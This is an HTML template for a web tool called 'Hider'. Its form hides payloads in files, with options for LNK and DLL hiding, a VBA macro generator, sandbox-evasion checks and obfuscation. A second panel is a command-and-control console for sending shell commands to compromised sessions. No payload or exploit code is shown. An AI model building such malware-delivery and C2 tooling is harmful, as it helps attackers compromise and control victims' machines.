<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hider | Advanced Steganography</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
</head>
<body>
    <div class="background-blobs">
        <div class="blob blob-1"></div>
        <div class="blob blob-2"></div>
        <div class="blob blob-3"></div>
    </div>
    
    <main class="container">
        <header class="glass animate-in">
            <h1>Hider<span>.io</span></h1>
            <p>Advanced Metadata & Steganography Engine</p>
        </header>

        <section class="main-card glass animate-in-delay">
            <form id="hider-form">
                <div id="file-upload">
                    <div class="drop-zone" id="drop-zone">
                        <span class="drop-zone__prompt">Drop file here or click to upload</span>
                        <input type="file" name="file" id="file-input" class="drop-zone__input">
                    </div>
                </div>

                <div class="settings-grid">
                    <div class="input-group">
                        <label>Command Type</label>
                        <select name="command" id="command-select">
                            <option value="universal">Universal (Tail-loading)</option>
                            <option value="pdf">PDF Manipulation</option>
                            <option value="office">Office Document</option>
                            <option value="dll">DLL / PE Hiding</option>
                            <option value="video">Video Manipulation</option>
                            <option value="audio">Audio (.WAV) Steganography</option>
                            <option value="archive">Archive (.ZIP) Steganography</option>
                            <option value="lsb">LSB Steganography</option>
                            <option value="shortcut">Shortcut (.LNK) Evasion</option>
                            <option value="evasion">Sandbox Evasion Wrappers</option>
                            <option value="vba">VBA Macro Generator</option>
                        </select>
                    </div>

                    <div class="input-group">
                        <label>Mode</label>
                        <select name="mode" id="mode-select">
                            <!-- Dynamic -->
                        </select>
                    </div>
                </div>

                <div id="dynamic-inputs">
                    <div class="form-group" id="data-group" style="display: none;">
                        <label id="data-label" for="data-input">Payload / Data</label>
                        <textarea id="data-input" name="data" rows="4"></textarea>
                    </div>

                    <div class="form-group" id="password-group" style="display: none;">
                        <label for="password-input">AES-256 Encryption Password (Optional)</label>
                        <input type="password" id="password-input" name="password" placeholder="Leave blank for unencrypted">
                    </div>

                    <div class="form-check" id="obfuscate-group" style="display: none;">
                        <input type="checkbox" name="obfuscate" id="obfuscate" value="true">
                        <label for="obfuscate">Enable Advanced Evasion (Obfuscation)</label>
                    </div>

                    <div id="evasion-group" style="display: none; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 10px;">
                        <h4 style="margin-bottom: 10px;">Sandbox Evasion Settings</h4>
                        <div class="settings-grid">
                            <div class="input-group">
                                <label>Wrapper Type</label>
                                <select name="evasion_type">
                                    <option value="jscript">JScript</option>
                                    <option value="vbscript">VBScript</option>
                                </select>
                            </div>
                            <div class="input-group">
                                <label>Sleep Before Exec (ms)</label>
                                <input type="number" name="sleep_ms" value="0" min="0">
                            </div>
                            <div class="input-group">
                                <label>Min RAM (GB)</label>
                                <input type="number" name="min_ram" value="0" min="0">
                            </div>
                            <div class="input-group">
                                <label>Min CPU Cores</label>
                                <input type="number" name="min_cores" value="0" min="0">
                            </div>
                        </div>
                        <div class="form-check" style="margin-top: 10px;">
                            <input type="checkbox" name="check_domain" id="check_domain" value="true">
                            <label for="check_domain">Abort if NOT on a Windows Domain</label>
                        </div>
                    </div>
                </div>

                <button type="submit" class="btn-primary" id="submit-btn">
                    <span class="btn-text">Process File</span>
                    <div class="loader hidden"></div>
                </button>
            </form>
            
            <div id="result-area" class="hidden animate-in">
                <div class="success-banner">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
                    <span>Success! File processed.</span>
                </div>
                <a id="download-link" href="#" class="btn-secondary">Download Result</a>
            </div>
        </section>

        <!-- ─── C2 Operator Console ─── -->
        <section class="main-card glass animate-in-delay" style="margin-top: 2rem;">
            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 1rem; margin-bottom: 1rem;">
                <h2>C2 Operator Console</h2>
                <div style="display: flex; gap: 0.5rem;">
                    <button class="btn-secondary" id="refresh-sessions-btn" style="padding: 0.5rem 1rem;">Refresh</button>
                    <button class="btn-primary" id="auto-refresh-btn" style="padding: 0.5rem 1rem;" data-active="false">Auto: OFF</button>
                </div>
            </div>

            <div class="table-container" style="overflow-x: auto;">
                <table id="c2-sessions-table" style="width: 100%; border-collapse: collapse; text-align: left;">
                    <thead>
                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.2);">
                            <th style="padding: 8px;">ID</th>
                            <th style="padding: 8px;">User</th>
                            <th style="padding: 8px;">Hostname</th>
                            <th style="padding: 8px;">OS</th>
                            <th style="padding: 8px;">IP</th>
                            <th style="padding: 8px;">Last Seen</th>
                            <th style="padding: 8px;">Status</th>
                            <th style="padding: 8px;">Action</th>
                        </tr>
                    </thead>
                    <tbody id="c2-sessions-body">
                        <tr>
                            <td colspan="8" style="text-align: center; padding: 1rem; color: #a1a1aa;">No active sessions found.</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Interaction Panel (Hidden by default) -->
            <div id="c2-interact-panel" class="hidden" style="margin-top: 2rem; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1rem;">
                <h3 style="margin-bottom: 1rem;">Interacting: <span id="c2-active-session" style="color: #6ee7b7;">None</span></h3>
                
                <div class="c2-results-window glass" id="c2-results" style="height: 300px; overflow-y: auto; padding: 1rem; margin-bottom: 1rem; font-family: monospace; font-size: 0.9rem; background: rgba(0,0,0,0.3); border-radius: 8px;">
                    <!-- Results populated dynamically -->
                </div>

                <div style="display: flex; gap: 1rem;">
                    <div class="input-group" style="flex-grow: 1; margin: 0;">
                        <input type="text" id="c2-cmd-input" placeholder="Enter shell command or module name..." style="margin: 0;">
                    </div>
                    <button class="btn-primary" id="c2-send-btn" style="margin: 0; padding: 0 2rem;">Send</button>
                </div>
                
                <div style="margin-top: 1rem; display: flex; gap: 0.5rem; flex-wrap: wrap;">
                    <button class="btn-secondary c2-quick-btn" data-mod="whoami" style="padding: 0.4rem 0.8rem; font-size: 0.85rem;">whoami</button>
                    <button class="btn-secondary c2-quick-btn" data-mod="sysinfo" style="padding: 0.4rem 0.8rem; font-size: 0.85rem;">sysinfo</button>
                    <button class="btn-secondary c2-quick-btn" data-mod="screenshot" style="padding: 0.4rem 0.8rem; font-size: 0.85rem;">screenshot</button>
                </div>
            </div>
        </section>
    </main>

    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
